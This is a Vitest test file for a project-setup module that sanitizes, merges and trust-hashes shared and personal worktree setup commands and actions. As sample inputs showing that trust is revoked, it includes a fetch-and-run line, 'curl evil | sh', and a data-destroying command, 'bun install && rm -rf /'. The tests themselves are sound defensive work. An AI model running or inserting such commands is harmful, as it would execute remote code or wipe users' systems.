import { describe, expect, it } from 'vitest';
import os from 'os';
import path from 'path';
import { mkdir, mkdtemp, readFile, rm, writeFile } from 'fs/promises';

import { createProjectConfigRuntime } from './project-config.js';
import { createProjectIdFromPath, projectPathFromId } from './project-id.js';
import {
  applySharedProjectSetupPatch,
  isSharedProjectConfigEmpty,
  mergeProjectSetup,
  normalizePlansDir,
  serializeSharedProjectConfig,
  parseSharedProjectConfig,
  sharedTrustHashOf,
  projectSetupPatchToStored,
  projectSetupViewOf,
  sanitizeDraftStarters,
  sanitizeProjectActions,
  sanitizeSetupCommands,
} from './project-setup.js';

const emptyPersonal = {
  setupWorktree: [],
  setupWorktreeWait: null,
  setupWorktreeMode: 'append',
  projectActions: [],
  projectActionsPrimaryId: null,
  draftStarters: [],
  hiddenSharedActionIds: [],
  sharedTrust: null,
};

const createRuntime = async () => {
  const tempRoot = await mkdtemp(path.join(os.tmpdir(), 'oc-project-setup-'));
  const runtime = createProjectConfigRuntime({
    fsPromises: await import('fs/promises'),
    path,
    projectsDirPath: path.join(tempRoot, 'projects'),
    createTaskID: () => 'task-fixed-id',
  });
  return {
    runtime,
    tempRoot,
    readRaw: async (projectId) => JSON.parse(await readFile(path.join(tempRoot, 'projects', `${projectId}.json`), 'utf8')),
    cleanup: () => rm(tempRoot, { recursive: true, force: true }),
  };
};

describe('project setup sanitizers', () => {
  it('keeps only non-empty trimmed setup commands', () => {
    expect(sanitizeSetupCommands([' bun install ', '', 42, '\n'])).toEqual(['bun install']);
    expect(sanitizeSetupCommands('bun install')).toEqual([]);
  });

  it('drops actions without id, name, or command and duplicate ids', () => {
    expect(sanitizeProjectActions([
      { id: 'a', name: 'Dev', command: 'bun run dev' },
      { id: 'a', name: 'Again', command: 'x' },
      { id: '', name: 'No id', command: 'x' },
      { id: 'b', name: '', command: 'x' },
      'not an action',
    ])).toEqual([{ id: 'a', name: 'Dev', command: 'bun run dev', icon: null }]);
  });

  it('keeps only the optional action fields the user set', () => {
    expect(sanitizeProjectActions([{
      id: 'a',
      name: 'Dev',
      command: 'bun run dev',
      icon: ' rocket ',
      runIn: 'parent',
      platforms: ['macos', 'MacOS', 'plan9', 'linux'],
      autoOpenUrl: true,
      openUrl: 'http://localhost:3000',
      desktopOpenSshForward: '',
    }])).toEqual([{
      id: 'a',
      name: 'Dev',
      command: 'bun run dev',
      icon: 'rocket',
      autoOpenUrl: true,
      openUrl: 'http://localhost:3000',
      platforms: ['macos', 'linux'],
      runIn: 'parent',
    }]);
  });

  it('treats any runIn other than parent as the worktree default', () => {
    const [worktree, number] = sanitizeProjectActions([
      { id: 'a', name: 'A', command: 'x', runIn: 'worktree' },
      { id: 'b', name: 'B', command: 'x', runIn: 123 },
    ]);
    expect(worktree).not.toHaveProperty('runIn');
    expect(number).not.toHaveProperty('runIn');
  });

  it('dedupes draft starters by type and name', () => {
    expect(sanitizeDraftStarters([
      { type: 'skill', name: 'triage-prs' },
      { type: 'skill', name: 'triage-prs' },
      { type: 'command', name: ' explore ' },
      { type: 'agent', name: 'nope' },
    ])).toEqual([{ type: 'skill', name: 'triage-prs' }, { type: 'command', name: 'explore' }]);
  });

  it('builds the personal view from the on-disk keys and nulls a dangling primary action', () => {
    expect(projectSetupViewOf({
      'setup-worktree': ['bun install'],
      'setup-worktree-wait': true,
      setupWorktreeMode: 'replace',
      projectActions: [{ id: 'a', name: 'A', command: 'x' }],
      projectActionsPrimaryId: 'missing',
      draftStarters: [{ type: 'skill', name: 's' }],
      hiddenSharedActionIds: ['dev', '', 'dev', 7],
      sharedTrust: { hash: 'sha256:abc', trustedAt: 5 },
      scheduledTasks: [{ id: 't' }],
    })).toEqual({
      setupWorktree: ['bun install'],
      setupWorktreeWait: true,
      setupWorktreeMode: 'replace',
      projectActions: [{ id: 'a', name: 'A', command: 'x', icon: null }],
      projectActionsPrimaryId: null,
      draftStarters: [{ type: 'skill', name: 's' }],
      hiddenSharedActionIds: ['dev'],
      sharedTrust: { hash: 'sha256:abc', trustedAt: 5 },
    });
    expect(projectSetupViewOf(null)).toEqual(emptyPersonal);
  });

  it('maps a patch to the stored keys it names and rejects wrong shapes', () => {
    expect(projectSetupPatchToStored({
      setupWorktree: ['a'],
      projectActionsPrimaryId: null,
      hiddenSharedActionIds: ['x'],
      setupWorktreeMode: 'replace',
    })).toEqual({
      'setup-worktree': ['a'],
      projectActionsPrimaryId: undefined,
      hiddenSharedActionIds: ['x'],
      setupWorktreeMode: 'replace',
    });
    expect(projectSetupPatchToStored({})).toEqual({});
    expect(() => projectSetupPatchToStored({ setupWorktree: 'a' })).toThrow('setupWorktree must be');
    expect(() => projectSetupPatchToStored({ setupWorktreeWait: 'yes' })).toThrow('setupWorktreeWait must be');
    expect(() => projectSetupPatchToStored({ projectActions: {} })).toThrow('projectActions must be');
    expect(() => projectSetupPatchToStored({ draftStarters: null })).toThrow('draftStarters must be');
    expect(() => projectSetupPatchToStored({ hiddenSharedActionIds: 'dev' })).toThrow('hiddenSharedActionIds must be');
    expect(() => projectSetupPatchToStored({ setupWorktreeMode: 'merge' })).toThrow('setupWorktreeMode must be');
    expect(() => projectSetupPatchToStored({ sharedTrustHash: '' })).toThrow('sharedTrustHash must be');
    expect(projectSetupPatchToStored({ sharedTrustHash: null })).toEqual({ sharedTrust: undefined });
    expect(projectSetupPatchToStored({ sharedTrustHash: 'sha256:x' }).sharedTrust).toMatchObject({ hash: 'sha256:x' });
    expect(() => projectSetupPatchToStored([])).toThrow('patch must be');
  });
});

describe('shared project config', () => {
  it('accepts a relative plansDir inside the repo only', () => {
    expect(normalizePlansDir(' docs/plans/ ')).toBe('docs/plans');
    expect(normalizePlansDir('./.openchamber/plans')).toBe('.openchamber/plans');
    expect(normalizePlansDir('docs\\plans')).toBe('docs/plans');
    expect(normalizePlansDir('/etc')).toBeNull();
    expect(normalizePlansDir('C:/plans')).toBeNull();
    expect(normalizePlansDir('../sibling/plans')).toBeNull();
    expect(normalizePlansDir('docs/../../x')).toBeNull();
    expect(normalizePlansDir('')).toBeNull();
  });

  it('parses a version-1 file and sanitizes its lists', () => {
    expect(parseSharedProjectConfig(JSON.stringify({
      version: 1,
      setupWorktree: ['bun install', ''],
      setupWorktreeWait: true,
      projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev' }, { id: '', name: 'x', command: 'y' }],
      draftStarters: [{ type: 'skill', name: 's' }],
      plansDir: 'docs/plans',
    }))).toEqual({
      status: 'ok',
      config: {
        setupWorktree: ['bun install'],
        setupWorktreeWait: true,
        projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev', icon: null }],
        draftStarters: [{ type: 'skill', name: 's' }],
        plansDir: 'docs/plans',
      },
    });
    expect(parseSharedProjectConfig('{"version":1}')).toEqual({
      status: 'ok',
      config: { setupWorktree: [], setupWorktreeWait: null, projectActions: [], draftStarters: [], plansDir: null },
    });
  });

  it('reports a broken file as invalid with a reason, never as empty', () => {
    expect(parseSharedProjectConfig('{ nope').status).toBe('invalid');
    expect(parseSharedProjectConfig('[]')).toEqual({ status: 'invalid', reason: 'not an object' });
    expect(parseSharedProjectConfig('{"version":2}').reason).toMatch(/unsupported version/);
    expect(parseSharedProjectConfig('{"version":1,"setupWorktree":"bun install"}').reason).toMatch(/setupWorktree must be/);
    expect(parseSharedProjectConfig('{"version":1,"plansDir":"/etc"}').reason).toMatch(/plansDir/);
  });

  it('merges shared and personal by the agreed rules', () => {
    const shared = {
      status: 'ok',
      config: {
        setupWorktree: ['bun install'],
        setupWorktreeWait: true,
        projectActions: [
          { id: 'dev', name: 'Dev', command: 'bun run dev', icon: null },
          { id: 'test', name: 'Test', command: 'bun test', icon: null },
          { id: 'lint', name: 'Lint', command: 'bun lint', icon: null },
        ],
        draftStarters: [{ type: 'skill', name: 'shared-skill' }, { type: 'command', name: 'both' }],
        plansDir: 'docs/plans',
      },
    };
    const personal = {
      ...emptyPersonal,
      setupWorktree: ['cp .env.example .env'],
      projectActions: [{ id: 'test', name: 'My test', command: 'bun test --watch', icon: null }],
      projectActionsPrimaryId: 'test',
      draftStarters: [{ type: 'command', name: 'both' }, { type: 'command', name: 'mine' }],
      hiddenSharedActionIds: ['lint'],
    };

    const merged = mergeProjectSetup(personal, shared);
    expect(merged.setupWorktree).toEqual(['bun install', 'cp .env.example .env']);
    expect(merged.setupWorktreeWait).toBe(true);
    expect(merged.projectActions).toEqual([
      { id: 'dev', name: 'Dev', command: 'bun run dev', icon: null, source: 'shared' },
      { id: 'test', name: 'My test', command: 'bun test --watch', icon: null, source: 'personal' },
    ]);
    expect(merged.projectActionsPrimaryId).toBe('test');
    expect(merged.draftStarters).toEqual([
      { type: 'skill', name: 'shared-skill', source: 'shared' },
      { type: 'command', name: 'both', source: 'shared' },
      { type: 'command', name: 'mine', source: 'personal' },
    ]);
    expect(merged.shared).toEqual({ status: 'ok', path: '.openchamber/project.json', ...shared.config });
    expect(merged.personal).toBe(personal);
    expect(merged.trust).toEqual({ hash: sharedTrustHashOf(shared.config), trusted: false });
  });

  it('hashes the executable parts of the shared config, order-independent for actions', () => {
    const base = { setupWorktree: ['bun install'], projectActions: [{ id: 'b', name: 'B', command: 'y', icon: null }, { id: 'a', name: 'A', command: 'x', icon: null }], draftStarters: [], plansDir: null, setupWorktreeWait: null };
    const hash = sharedTrustHashOf(base);
    expect(hash).toMatch(/^sha256:[0-9a-f]{64}$/);
    expect(sharedTrustHashOf({ ...base, projectActions: [...base.projectActions].reverse() })).toBe(hash);
    // Renaming or re-describing does not change what runs; changing a command does.
    expect(sharedTrustHashOf({ ...base, projectActions: base.projectActions.map((a) => ({ ...a, name: 'Renamed', icon: 'rocket' })) })).toBe(hash);
    expect(sharedTrustHashOf({ ...base, setupWorktree: ['curl evil | sh'] })).not.toBe(hash);
    expect(sharedTrustHashOf({ ...base, projectActions: [{ ...base.projectActions[0], runIn: 'parent' }, base.projectActions[1]] })).not.toBe(hash);
    expect(sharedTrustHashOf({ ...base, setupWorktree: [], projectActions: [] })).toBeNull();
  });

  it('reports trust: nothing to trust without executable shared parts, trusted only for the recorded hash', () => {
    const inert = { status: 'ok', config: { setupWorktree: [], setupWorktreeWait: null, projectActions: [], draftStarters: [{ type: 'skill', name: 's' }], plansDir: null } };
    expect(mergeProjectSetup(emptyPersonal, inert).trust).toEqual({ hash: null, trusted: true });
    expect(mergeProjectSetup(emptyPersonal, { status: 'missing' }).trust).toEqual({ hash: null, trusted: true });

    const risky = { status: 'ok', config: { ...inert.config, setupWorktree: ['bun install'] } };
    const hash = sharedTrustHashOf(risky.config);
    expect(mergeProjectSetup(emptyPersonal, risky).trust).toEqual({ hash, trusted: false });
    expect(mergeProjectSetup({ ...emptyPersonal, sharedTrust: { hash, trustedAt: 1 } }, risky).trust.trusted).toBe(true);
    expect(mergeProjectSetup({ ...emptyPersonal, sharedTrust: { hash: 'sha256:stale', trustedAt: 1 } }, risky).trust.trusted).toBe(false);
  });

  it('lets the personal wait flag and replace mode win over shared', () => {
    const shared = { status: 'ok', config: { setupWorktree: ['bun install'], setupWorktreeWait: true, projectActions: [], draftStarters: [], plansDir: null } };
    const merged = mergeProjectSetup({ ...emptyPersonal, setupWorktree: ['mine'], setupWorktreeWait: false, setupWorktreeMode: 'replace' }, shared);
    expect(merged.setupWorktree).toEqual(['mine']);
    expect(merged.setupWorktreeWait).toBe(false);
  });

  it('carries an invalid shared read through with its reason and merges nothing from it', () => {
    const merged = mergeProjectSetup({ ...emptyPersonal, setupWorktree: ['mine'] }, { status: 'invalid', reason: 'invalid JSON: x' });
    expect(merged.setupWorktree).toEqual(['mine']);
    expect(merged.shared.status).toBe('invalid');
    expect(merged.shared.reason).toBe('invalid JSON: x');
    expect(merged.shared.projectActions).toEqual([]);
  });
});

describe('shared project config writes', () => {
  const empty = { setupWorktree: [], setupWorktreeWait: null, projectActions: [], draftStarters: [], plansDir: null };

  it('applies a patch over the current config and refuses wrong shapes', () => {
    const next = applySharedProjectSetupPatch({ ...empty, setupWorktree: ['old'] }, {
      projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev', source: 'personal', icon: '' }],
      plansDir: './docs/plans/',
    });
    expect(next.setupWorktree).toEqual(['old']);
    expect(next.projectActions).toEqual([{ id: 'dev', name: 'Dev', command: 'bun run dev', icon: null }]);
    expect(next.plansDir).toBe('docs/plans');
    expect(applySharedProjectSetupPatch(next, { plansDir: '' }).plansDir).toBeNull();
    expect(() => applySharedProjectSetupPatch(empty, { plansDir: '/etc' })).toThrow('plansDir must be');
    expect(() => applySharedProjectSetupPatch(empty, { setupWorktree: 'x' })).toThrow('setupWorktree must be');
    expect(() => applySharedProjectSetupPatch(empty, { setupWorktreeWait: 'yes' })).toThrow('setupWorktreeWait must be');
  });

  it('serializes version first, only the keys that carry something, without source marks', () => {
    expect(serializeSharedProjectConfig({ ...empty, projectActions: [{ id: 'dev', name: 'Dev', command: 'x', icon: null, source: 'personal' }], plansDir: 'docs/plans' })).toBe([
      '{',
      '  "version": 1,',
      '  "projectActions": [',
      '    {',
      '      "id": "dev",',
      '      "name": "Dev",',
      '      "command": "x"',
      '    }',
      '  ],',
      '  "plansDir": "docs/plans"',
      '}',
      '',
    ].join('\n'));
    expect(isSharedProjectConfigEmpty(empty)).toBe(true);
    expect(isSharedProjectConfigEmpty({ ...empty, setupWorktreeWait: false })).toBe(false);
  });
});

describe('project id', () => {
  it('round-trips a path through the id', () => {
    const id = createProjectIdFromPath('/Users/me/projects/repo/');
    expect(id.startsWith('path_')).toBe(true);
    expect(projectPathFromId(id)).toBe('/Users/me/projects/repo');
    expect(projectPathFromId('project-test')).toBe('');
    expect(projectPathFromId('path_')).toBe('');
  });
});

describe('project setup runtime', () => {
  it('reads an empty merged view for a project without files', async () => {
    const { runtime, cleanup } = await createRuntime();
    try {
      const view = await runtime.readProjectSetup('project-a');
      expect(view.setupWorktree).toEqual([]);
      expect(view.setupWorktreeWait).toBe(false);
      expect(view.projectActions).toEqual([]);
      expect(view.draftStarters).toEqual([]);
      expect(view.shared.status).toBe('missing');
      expect(view.personal).toEqual(emptyPersonal);
    } finally {
      await cleanup();
    }
  });

  it('round-trips a patch and preserves server-owned and unknown keys', async () => {
    const { runtime, tempRoot, readRaw, cleanup } = await createRuntime();
    try {
      await mkdir(path.join(tempRoot, 'projects'), { recursive: true });
      await writeFile(path.join(tempRoot, 'projects', 'project-a.json'), JSON.stringify({
        version: 1,
        scheduledTasks: [{ id: 'task', name: 'Keep me' }],
        futureKey: { from: 'a newer build' },
        'setup-worktree': ['old'],
      }));

      const view = await runtime.updateProjectSetup('project-a', {
        setupWorktree: ['bun install', ''],
        setupWorktreeWait: true,
        projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev' }],
        projectActionsPrimaryId: 'dev',
        projectPath: '/repo/a',
      });
      expect(view.setupWorktree).toEqual(['bun install']);
      expect(view.setupWorktreeWait).toBe(true);
      expect(view.projectActions).toEqual([{ id: 'dev', name: 'Dev', command: 'bun run dev', icon: null, source: 'personal' }]);
      expect(view.projectActionsPrimaryId).toBe('dev');

      const raw = await readRaw('project-a');
      expect(raw.scheduledTasks).toEqual([{ id: 'task', name: 'Keep me' }]);
      expect(raw.futureKey).toEqual({ from: 'a newer build' });
      expect(raw['setup-worktree']).toEqual(['bun install']);
      expect(raw['setup-worktree-wait']).toBe(true);
      expect(raw.projectPath).toBe('/repo/a');
      expect(await runtime.readProjectSetup('project-a')).toEqual(view);
    } finally {
      await cleanup();
    }
  });

  it('clears the primary action id when the patch sets it to null', async () => {
    const { runtime, readRaw, cleanup } = await createRuntime();
    try {
      await runtime.updateProjectSetup('project-a', {
        projectActions: [{ id: 'dev', name: 'Dev', command: 'x' }],
        projectActionsPrimaryId: 'dev',
      });
      await runtime.updateProjectSetup('project-a', { projectActionsPrimaryId: null });
      expect(await readRaw('project-a')).not.toHaveProperty('projectActionsPrimaryId');
      expect((await runtime.readProjectSetup('project-a')).projectActionsPrimaryId).toBeNull();
    } finally {
      await cleanup();
    }
  });

  it('leaves the file alone when the patch is invalid', async () => {
    const { runtime, tempRoot, cleanup } = await createRuntime();
    try {
      await expect(runtime.updateProjectSetup('project-a', { setupWorktree: 'nope' })).rejects.toThrow('setupWorktree must be');
      await expect(readFile(path.join(tempRoot, 'projects', 'project-a.json'), 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
    } finally {
      await cleanup();
    }
  });

  it('does not clobber a scheduled task written between read and write', async () => {
    const { runtime, readRaw, cleanup } = await createRuntime();
    try {
      await runtime.upsertScheduledTask('project-a', {
        name: 'Nightly',
        enabled: true,
        schedule: { kind: 'daily', time: '09:30', timezone: 'UTC' },
        execution: { prompt: 'hi', providerID: 'openai', modelID: 'gpt' },
      });
      await Promise.all([
        runtime.updateProjectSetup('project-a', { setupWorktree: ['bun install'] }),
        runtime.updateProjectSetup('project-a', { draftStarters: [{ type: 'skill', name: 's' }] }),
      ]);
      const raw = await readRaw('project-a');
      expect(raw.scheduledTasks).toHaveLength(1);
      expect(raw['setup-worktree']).toEqual(['bun install']);
      expect(raw.draftStarters).toEqual([{ type: 'skill', name: 's' }]);
    } finally {
      await cleanup();
    }
  });

  it('reads the shared file from the checkout the id names and merges it', async () => {
    const { runtime, tempRoot, cleanup } = await createRuntime();
    try {
      const repo = path.join(tempRoot, 'repo');
      await mkdir(path.join(repo, '.openchamber'), { recursive: true });
      await writeFile(path.join(repo, '.openchamber', 'project.json'), JSON.stringify({
        version: 1,
        setupWorktree: ['bun install'],
        projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev' }, { id: 'lint', name: 'Lint', command: 'bun lint' }],
        draftStarters: [{ type: 'skill', name: 'triage' }],
        plansDir: 'docs/plans',
      }));
      const projectId = createProjectIdFromPath(repo);

      const fresh = await runtime.readProjectSetup(projectId);
      expect(fresh.shared.status).toBe('ok');
      expect(fresh.shared.plansDir).toBe('docs/plans');
      expect(fresh.setupWorktree).toEqual(['bun install']);
      expect(fresh.projectActions.map((action) => `${action.id}:${action.source}`)).toEqual(['dev:shared', 'lint:shared']);

      const view = await runtime.updateProjectSetup(projectId, {
        setupWorktree: ['cp .env.example .env'],
        hiddenSharedActionIds: ['lint'],
        projectActions: [{ id: 'mine', name: 'Mine', command: 'x' }],
      });
      expect(view.setupWorktree).toEqual(['bun install', 'cp .env.example .env']);
      expect(view.projectActions.map((action) => `${action.id}:${action.source}`)).toEqual(['dev:shared', 'mine:personal']);
      expect(view.draftStarters).toEqual([{ type: 'skill', name: 'triage', source: 'shared' }]);
      expect(view.personal.hiddenSharedActionIds).toEqual(['lint']);

      expect(view.trust.trusted).toBe(false);
      const trusted = await runtime.updateProjectSetup(projectId, { sharedTrustHash: view.trust.hash });
      expect(trusted.trust.trusted).toBe(true);
      expect(trusted.personal.sharedTrust?.hash).toBe(view.trust.hash);
      // A pull that changes a shared command invalidates the answer.
      await writeFile(path.join(repo, '.openchamber', 'project.json'), JSON.stringify({ version: 1, setupWorktree: ['bun install && rm -rf /'] }));
      expect((await runtime.readProjectSetup(projectId)).trust.trusted).toBe(false);
      const reset = await runtime.updateProjectSetup(projectId, { sharedTrustHash: null });
      expect(reset.personal.sharedTrust).toBeNull();
    } finally {
      await cleanup();
    }
  });

  it('writes the shared file into the checkout, trusts it for the writer, and removes it when emptied', async () => {
    const { runtime, tempRoot, readRaw, cleanup } = await createRuntime();
    try {
      const repo = path.join(tempRoot, 'repo');
      await mkdir(repo, { recursive: true });
      const projectId = createProjectIdFromPath(repo);
      const sharedPath = path.join(repo, '.openchamber', 'project.json');

      const shared = await runtime.updateSharedProjectSetup(projectId, {
        setupWorktree: ['bun install'],
        projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev' }],
      });
      expect(JSON.parse(await readFile(sharedPath, 'utf8'))).toEqual({
        version: 1,
        setupWorktree: ['bun install'],
        projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev' }],
      });
      expect(shared.shared.status).toBe('ok');
      expect(shared.projectActions.map((action) => `${action.id}:${action.source}`)).toEqual(['dev:shared']);
      // The writer has seen what it shared: trusted here, prompt stays for teammates.
      expect(shared.trust.trusted).toBe(true);
      expect((await readRaw(projectId)).sharedTrust.hash).toBe(shared.trust.hash);

      // A second patch replaces only the keys it names.
      const withPlans = await runtime.updateSharedProjectSetup(projectId, { plansDir: 'docs/plans' });
      expect(withPlans.shared.plansDir).toBe('docs/plans');
      expect(withPlans.shared.setupWorktree).toEqual(['bun install']);

      const emptied = await runtime.updateSharedProjectSetup(projectId, { setupWorktree: [], projectActions: [], plansDir: null });
      expect(emptied.shared.status).toBe('missing');
      await expect(readFile(sharedPath, 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
      await expect(readFile(path.join(repo, '.openchamber'), 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
      expect((await readRaw(projectId)).sharedTrust).toBeUndefined();
    } finally {
      await cleanup();
    }
  });

  it('refuses to write the shared file for a checkout that does not exist and on a bad patch', async () => {
    const { runtime, tempRoot, cleanup } = await createRuntime();
    try {
      const projectId = createProjectIdFromPath(path.join(tempRoot, 'missing-repo'));
      await expect(runtime.updateSharedProjectSetup(projectId, { setupWorktree: ['x'] })).rejects.toThrow('project checkout not found');
      await expect(runtime.updateSharedProjectSetup('project-test', { setupWorktree: ['x'] })).rejects.toThrow('project checkout not found');
      const repo = path.join(tempRoot, 'repo');
      await mkdir(repo, { recursive: true });
      await expect(runtime.updateSharedProjectSetup(createProjectIdFromPath(repo), { plansDir: '../x' })).rejects.toThrow('plansDir must be');
      await expect(readFile(path.join(repo, '.openchamber', 'project.json'), 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
    } finally {
      await cleanup();
    }
  });

  it('resolves the repository plans folder: the default without plansDir, the configured one instead of it', async () => {
    const { runtime, tempRoot, cleanup } = await createRuntime();
    try {
      const repo = path.join(tempRoot, 'repo');
      await mkdir(repo, { recursive: true });
      const projectId = createProjectIdFromPath(repo);
      expect(await runtime.resolveSharedPlansDir(projectId)).toBe(path.join(repo, '.openchamber', 'plans'));
      await runtime.updateSharedProjectSetup(projectId, { plansDir: 'docs/plans' });
      expect(await runtime.resolveSharedPlansDir(projectId)).toBe(path.join(repo, 'docs', 'plans'));
      expect(await runtime.resolveSharedPlansDir('project-test')).toBeNull();
    } finally {
      await cleanup();
    }
  });

  it('reports a broken shared file as invalid and still serves the personal setup', async () => {
    const { runtime, tempRoot, cleanup } = await createRuntime();
    try {
      const repo = path.join(tempRoot, 'repo');
      await mkdir(path.join(repo, '.openchamber'), { recursive: true });
      await writeFile(path.join(repo, '.openchamber', 'project.json'), '{ broken');
      const projectId = createProjectIdFromPath(repo);
      await runtime.updateProjectSetup(projectId, { setupWorktree: ['mine'] });

      const view = await runtime.readProjectSetup(projectId);
      expect(view.shared.status).toBe('invalid');
      expect(view.shared.reason).toMatch(/invalid JSON/);
      expect(view.setupWorktree).toEqual(['mine']);
    } finally {
      await cleanup();
    }
  });
});
